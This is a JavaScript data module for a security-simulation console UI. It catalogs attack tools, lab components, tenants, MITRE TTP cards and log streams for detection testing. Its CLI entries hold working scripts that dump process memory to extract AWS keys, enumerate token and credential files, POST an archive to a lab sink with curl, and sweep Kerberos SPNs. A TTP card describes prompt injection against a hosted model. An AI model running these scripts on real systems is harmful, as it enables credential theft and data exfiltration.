/**
 * Packages, components, CLI items, the tenant, TTP cards and data streams.
 *
 * SEED CATALOG — carried over verbatim from the design prototype
 * (`POVengine Console.dc.html`, Claude Design project "Cortex POV Engine UI
 * Redesign"; see docs/design/DESIGN-SYNC.md).
 *
 * These are the authored corpus values the design was drawn against. Where
 * SimCore serves the same shape over the API, the surface prefers the API and
 * falls back to this; where it does not serve it yet, this IS the model, and
 * its shape is what the endpoint should eventually return. Do not "improve"
 * values here to make a screen look better — they are the numbers the design
 * conversation settled on, and several of them (12 components / 4 ready / 6
 * partial / 2 missing, 21 of 34 stream shapes, 6 of 9 datasets readable) are
 * quoted on more than one surface precisely so those surfaces cannot disagree.
 * Every tally is DERIVED from these rows, never restated as a literal.
 */

export // own ephemeral tooling.
const FAMILY_TINT = {
  cortex: '#00CC66',
  collector: '#00CC66',
  ngfw: '#FA582D',
  pov: '#C7C7C7',
}

export const FAMILY_LABEL = {
  cortex: 'Cortex',
  collector: 'Collector',
  ngfw: 'NGFW',
  pov: 'POVengine',
}

export function toolCatalog() {
  return [
    ['TOOL-LINPEAS', 'linpeas.sh privilege audit', '4', '9f2c…c41', 'delivered', ['BIOC', 'XQL'], ['discovery', 'credential access'],
      ['Privilege-audit sweep on the host', 'Service-account and token enumeration'], ['EDR', 'ITDR'], 4],
    ['TOOL-ATOMIC-RED', 'Atomic Red Team harness', '2', '3b71…8ad', 'consent', ['BIOC', 'ABIOC', 'Correlation'], ['execution', 'discovery'],
      ['Technique battery across a MITRE tactic', 'Behavioural baseline for analytics'], ['EDR', 'ANALYTICS'], 12],
    ['TOOL-SLIVER', 'Sliver implant (lab build)', '3', 'c40e…112', 'delivered', ['BIOC', 'Correlation'], ['execution', 'lateral movement'],
      ['C2 beacon with jittered callback', 'Process injection into a live parent'], ['EDR', 'NDR'], 3],
    ['TOOL-MIMIKATZ', 'Credential dump (windows)', '4', '77aa…9f0', 'blocked', ['ABIOC', 'BIOC'], ['credential access', 'lateral movement'],
      ['Credential access in process memory', 'Kerberos ticket forge'], ['EDR', 'ITDR'], 5],
    ['TOOL-HYDRA', 'Network auth bruteforce', '4', '—', 'not sent', ['XQL'], ['credential access'],
      ['Authentication failure burst', 'Spray across a service account list'], ['ITDR', 'NDR'], 2],
    ['TOOL-KUBE-HUNTER', 'K8s attack surface probe', '3', '5ee1…b33', 'delivered', ['XQL', 'BIOC'], ['discovery', 'execution'],
      ['Cluster recon from inside a pod', 'Secret read through the control plane'], ['CDR', 'CSPM'], 6],
    ['TOOL-CHISEL', 'TCP tunnel over HTTP', '4', 'a10c…77e', 'not sent', ['XQL', 'Correlation'], ['tunneling', 'exfiltration'],
      ['Egress tunnel on an allowed port', 'Port relay back through the beacon'], ['NDR'], 4],
    ['TOOL-BROWSER-RUNNER', 'Playwright attack runner', '2', 'd902…41c', 'delivered', ['BIOC', 'XQL'], ['session theft', 'execution'],
      ['Browser session and cookie theft', 'Prompt abuse against a hosted model'], ['BROWSER', 'AI_ACCESS'], 7],
  ].map(([id, name, tier, sha, host, dets, outcomes, outcomeText, planes, usedBy]) =>
    ({ id, name, tier, sha, host, dets, outcomes, outcomeText, planes, usedBy }))
}

export function componentCatalog() {
  // Accent follows the product family, not the state: Cortex and its
  // collectors take Cortex green, NGFW takes the parent brand orange,
  // POVengine's own ephemeral tooling stays neutral.
  return [
    ['sim', 'cortex', 'AGT', 'Cortex Agent', 'beacon · 4 instances · v0.9.4', 'ready',
      [['Instances', '4 enrolled'], ['Online', '2'], ['Dispatch', 'pull · 4s']],
      'Command execution on the host and the endpoint-plane telemetry that follows it.'],
    ['sim', 'cortex', 'BVM', 'Broker VM', 'appliance · broker-relay-01', 'partial',
      [['Registration', 'bound to tenant'], ['Syslog', ':514 up'], ['Relay rule', 'not configured']],
      'Syslog and third-party streams into the tenant on the network plane. Registered, but no relay rule means nothing forwards.'],
    ['sim', 'collector', 'HTTP', 'HTTP collector', 'BVM collector · not created', 'missing',
      [['Endpoint', '—'], ['Auth', '—'], ['TLS cert', '—']],
      'JSON push intake for third-party events with no syslog form. Until it exists, push-shaped sources cannot be exercised.'],
    ['sim', 'collector', 'SYS', 'Syslog collector', 'BVM collector · udp/tcp 514', 'ready',
      [['Port', '514'], ['Sources', '6 bound'], ['Format', 'RFC5424']],
      'Appliance and network-device logs at the shape the customer really sends them.'],
    ['sim', 'ngfw', 'NGFW', 'Next-generation firewall', 'PA-VM · test zone · Strata', 'partial',
      [['Security profile', 'Outbound-Strict'], ['Posture', 'block on test zone'], ['Log forwarding', 'to BVM']],
      'Session-level truth for the network plane: what actually left, and whether it was allowed to. A blocking profile leaves nothing to judge.'],
    ['sim', 'collector', 'DNS', 'DNS sink', 'lab collector · dns-sink-01', 'ready',
      [['Capture', 'tunnel + entropy'], ['Scope', 'lab only'], ['Retention', '24h']],
      'Egress proof on the wire when the NGFW path is unavailable. Lab traffic, and the report says so.'],
    ['sim', 'pov', 'EAL', 'EAL emitter', 'simulator · eal-collector', 'partial',
      [['Stream shapes', '34 authored'], ['Covered', '21'], ['Rate', 'customer-true']],
      'External activity logs emitted at production shape and rate. Seven shapes still have no emitter behind them.'],
    ['sim', 'pov', 'SIM', 'SimCore host', 'jumpbox · simcore-01', 'ready',
      [['Artifact shelf', '8 packages'], ['Lifetime', 'dies with lab'], ['Egress', 'default-deny']],
      'POVengine itself and the staged artifact shelf. Nothing it serves is fetched at dispatch time.'],
    ['ctx', 'cortex', 'CC', 'Cortex Cloud Connector', 'agentless · 2 of 3 environments', 'partial',
      [['AWS', 'live'], ['GCP', 'live'], ['Azure', 'not enrolled']],
      'Cloud audit and runtime signal with no beacon on the workload. Azure is uncovered, not undetected.'],
    ['ctx', 'cortex', 'DC', 'Cortex Data Connector', 'third-party ingest · 21 of 34 shapes', 'partial',
      [['Shapes normalised', '21'], ['Gaps', '7'], ['Scoring', 'native-equivalent']],
      'Third-party streams normalised so they score like native telemetry rather than as second-class logs.'],
    ['ctx', 'cortex', 'ENG', 'Cortex Engine content', 'BIOC · ABIOC · correlation packs', 'missing',
      [['BIOC packs', 'installed'], ['Correlation', '2 disabled'], ['Baseline', '24h present']],
      'The detection objects a run expects to fire. Two correlation rules are present but disabled, so they cannot fire at all.'],
    ['ctx', 'cortex', 'API', 'Cortex API & Marketplace', 'read-only key · 4 integrations', 'partial',
      [['Key scope', 'read:alerts'], ['Datasets', 'partial'], ['Indicator pack', 'not installed']],
      'Validation probes and vendor integrations. The narrow key scope is deliberate; anything it cannot read is reported unverifiable.'],
  ].map(([group, family, code, name, endpoint, state, facts, carries]) =>
    ({ group, family, code, name, endpoint, state, facts, carries, tint: FAMILY_TINT[family] }))
}

export function cliCatalog() {
  return [
    {
      id: 'CLI-0007', name: 'Read broker credential from memory', shell: 'bash',
      platform: 'linux/amd64', identity: 'root (direct)', timeout: '90s',
      path: '/tmp/.cache/cred-read.sh', sha: 'sha256 4c1f…8be', state: 'ready',
      plane: 'EDR', technique: 'T1003.001', usedBy: 2, dets: ['BIOC', 'ABIOC'],
      teardown: 'rm -f /tmp/.cache/dump.* /tmp/.cache/cred-read.sh',
      body: '#!/usr/bin/env bash\nset -euo pipefail\n\nPID=$(pgrep -f cortex-broker | head -1)\ngcore -o /tmp/.cache/dump "$PID"\nstrings /tmp/.cache/dump."$PID" \\\n  | grep -Eo "AKIA[0-9A-Z]{16}" | head -1\nrm -f /tmp/.cache/dump."$PID"',
    },
    {
      id: 'CLI-0011', name: 'Enumerate service accounts and tokens', shell: 'bash',
      platform: 'linux/amd64 · linux/arm64', identity: 'www-data via runuser', timeout: '60s',
      path: '/tmp/.cache/enum.sh', sha: 'sha256 9a02…31d', state: 'ready',
      plane: 'ITDR', technique: 'T1087.001', usedBy: 3, dets: ['XQL', 'BIOC'],
      teardown: 'rm -f /tmp/.cache/enum.out /tmp/.cache/enum.sh',
      body: '#!/usr/bin/env bash\nset -euo pipefail\n\ngetent passwd | awk -F: \'$3>=1000\' | tee /tmp/.cache/enum.out\nfind / -name "*.token" -readable 2>/dev/null | head -20\nls -la ~/.aws ~/.kube 2>/dev/null || true',
    },
    {
      id: 'CLI-0014', name: 'Stage archive to personal cloud storage', shell: 'bash',
      platform: 'linux/amd64', identity: 'node', timeout: '120s',
      path: '/tmp/.cache/stage-exfil.sh', sha: 'sha256 e71b…0cf', state: 'draft',
      plane: 'DLP', technique: 'T1567.002', usedBy: 0, dets: ['XQL'],
      teardown: 'rm -rf /tmp/.cache/stage',
      body: '#!/usr/bin/env bash\nset -euo pipefail\n\nmkdir -p /tmp/.cache/stage\ntar czf /tmp/.cache/stage/reports.tgz /srv/reports\n# destination is the lab sink, never a real provider\ncurl -fsS -X POST --data-binary @/tmp/.cache/stage/reports.tgz \\\n  http://eal-collector:9200/ingest',
    },
    {
      id: 'CLI-0019', name: 'Kerberoast SPN sweep', shell: 'powershell',
      platform: 'windows/amd64', identity: 'direct (no harness)', timeout: '90s',
      path: 'C:\\Windows\\Temp\\spn-sweep.ps1', sha: 'sha256 22de…7a4', state: 'draft',
      plane: 'ITDR', technique: 'T1558.003', usedBy: 0, dets: ['BIOC', 'ABIOC'],
      teardown: 'Remove-Item C:\\Windows\\Temp\\spn-sweep.ps1 -Force',
      body: '$ErrorActionPreference = "Stop"\n\n$search = New-Object DirectoryServices.DirectorySearcher\n$search.Filter = "(&(objectClass=user)(servicePrincipalName=*))"\n$search.FindAll() | ForEach-Object {\n  $_.Properties["serviceprincipalname"]\n}',
    },
  ]
}

export function tenantCatalog() {
  return [
    {
      name: 'Acme Financial', host: 'acme-prod.xdr.us', region: 'us-west-2',
      state: 'bound', ents: ['XSIAM', 'CLOUD', 'ITDR'], keyId: '4',
      facts: [
        ['API key scope', 'read:alerts', 'warn'],
        ['Datasets readable', '6 of 9', 'warn'],
        ['Retention', '24h – 30d', 'plain'],
        ['Content packs', '2 missing', 'crit'],
        ['Suppression rules', '2 match lab host', 'crit'],
      ],
    },
    {
      name: 'Northwind Health', host: 'nwh.xdr.eu', region: 'eu-central-1',
      state: 'available', ents: ['XSIAM', 'DLP'], keyId: '7',
      facts: [
        ['API key scope', 'read:all', 'pos'],
        ['Datasets readable', '9 of 9', 'pos'],
        ['Retention', '90d', 'plain'],
        ['Content packs', 'complete', 'pos'],
        ['Suppression rules', 'none', 'pos'],
      ],
    },
    {
      name: 'lab-local', host: 'no tenant · offline scoring', region: 'n/a',
      state: 'offline', ents: ['TIER-1'], keyId: '—',
      facts: [
        ['API key scope', '—', 'dim'],
        ['Datasets readable', '—', 'dim'],
        ['Retention', 'local only', 'dim'],
        ['Content packs', 'n/a', 'dim'],
        ['Scoring', 'authored only', 'warn'],
      ],
    },
  ]
}

export function ttpCatalog() {
  return [
    ['TTP-2026-0032', 'Credential access from process memory', 'T1003.001', 'EDR', ['BIOC', 'ABIOC', 'XQL'], 4, 6,
      'linux · windows', 'gcore / ProcDump against a broker process, then string extraction'],
    ['TTP-2026-0045', 'Editor extension reads cloud credentials', 'T1195.002', 'KOI', ['BIOC', 'Correlation'], 3, 2,
      'linux · darwin', 'VSCode extension reads ~/.aws/credentials outside an interactive session'],
    ['TTP-2026-0061', 'Role assumption with a stolen key', 'T1078.004', 'CDR', ['XQL', 'Correlation'], 5, 7,
      'aws · gcp', 'sts:AssumeRole from an IP and identity with no prior history'],
    ['TTP-2026-0074', 'Bucket enumeration and bulk object read', 'T1567.002', 'CDR', ['XQL'], 2, 5,
      'aws · gcp', 'List then sync an entire prefix in a single session'],
    ['TTP-2026-0088', 'DNS tunnel with jittered beacon', 'T1071.004', 'NDR', ['XQL', 'BIOC'], 3, 3,
      'any', 'High-entropy TXT queries at irregular intervals to one authority'],
    ['TTP-2026-0093', 'Kerberoast then ticket forge', 'T1558.003', 'ITDR', ['BIOC', 'ABIOC', 'Correlation'], 6, 4,
      'windows', 'SPN enumeration, offline crack, then a forged TGS presented back'],
    ['TTP-2026-0104', 'Prompt injection against a hosted model', 'LLM01', 'AIRS', ['XQL'], 2, 1,
      'any', 'Instruction override in user content that leaks the system prompt'],
    ['TTP-2026-0117', 'Browser session and cookie theft', 'T1539', 'BROWSER', ['BIOC', 'XQL'], 3, 2,
      'windows · darwin', 'Read of the browser cookie store by a non-browser process'],
  ].map(([id, name, technique, plane, dets, objects, usedBy, platforms, behaviour]) =>
    ({ id, name, technique, plane, dets, objects, usedBy, platforms, behaviour }))
}

export function streamCatalog() {
  return [
    ['CrowdStrike Falcon', 'EDR · third-party', 'crowdstrike_raw', 'syslog', 5, 'eal · falcon_detect.yml', 'emitting', 'Relayed through the BVM and normalised by the Data Connector.'],
    ['Microsoft Defender', 'EDR · third-party', 'msft_defender_raw', 'API pull', 4, 'eal · defender_alert.yml', 'emitting', 'Pulled on a schedule by the Data Connector.'],
    ['Proofpoint TAP', 'email security', 'proofpoint_raw', 'API pull', 3, 'eal · tap_message.yml', 'emitting', 'Pulled on a schedule by the Data Connector.'],
    ['Okta', 'identity provider', 'okta_sso_raw', 'HTTP push', 4, 'no HTTP collector', 'blocked', 'Okta pushes JSON; no HTTP collector exists on the BVM to receive it. Constraint C-07.'],
    ['Zscaler', 'proxy · SWG', 'zscaler_raw', 'syslog', 3, 'eal · zia_weblog.yml', 'emitting', 'Relayed through the BVM on 514.'],
    ['AWS CloudTrail', 'cloud audit', 'aws_cloudtrail_raw', 'connector', 5, 'cloud connector', 'emitting', 'Agentless, straight through the Cloud Connector.'],
    ['Cisco ASA', 'network · firewall', 'cisco_asa_raw', 'syslog', 3, 'relay rule missing', 'blocked', 'Arrives at the BVM but no relay rule forwards it to the tenant. Constraint C-03.'],
    ['Trend Micro Vision One', 'EDR · third-party', 'trendmicro_raw', 'API pull', 2, 'no emitter authored', 'gap', 'Shape is authored in the corpus but nothing emits it, so it cannot be exercised.'],
    ['Netskope', 'CASB', 'netskope_raw', 'HTTP push', 3, 'no emitter authored', 'gap', 'Shape is authored in the corpus but nothing emits it, so it cannot be exercised.'],
    ['Custom app · JSON', 'in-house', 'acme_app_raw', 'HTTP push', 2, 'no emitter authored', 'gap', 'Customer-specific shape with no emitter yet. Authoring one is a scoping decision.'],
  ].map(([name, vendor, dataset, intake, shapes, emitter, state, note]) =>
    ({ name, vendor, dataset, intake, shapes, emitter, state, note }))
}


/** Tally the component catalog by state. The summary strip, the card pills and
 *  the flow-bar hint all read THIS, never a literal — an earlier revision of
 *  this screen quoted 6/3/2 in the strip against a catalog that was really
 *  4/5/2, which on a readiness screen is the one number that cannot be wrong. */
export function componentTally(rows = componentCatalog()) {
  return {
    total: rows.length,
    ready: rows.filter((c) => c.state === 'ready').length,
    partial: rows.filter((c) => c.state === 'partial').length,
    missing: rows.filter((c) => c.state === 'missing').length,
  }
}
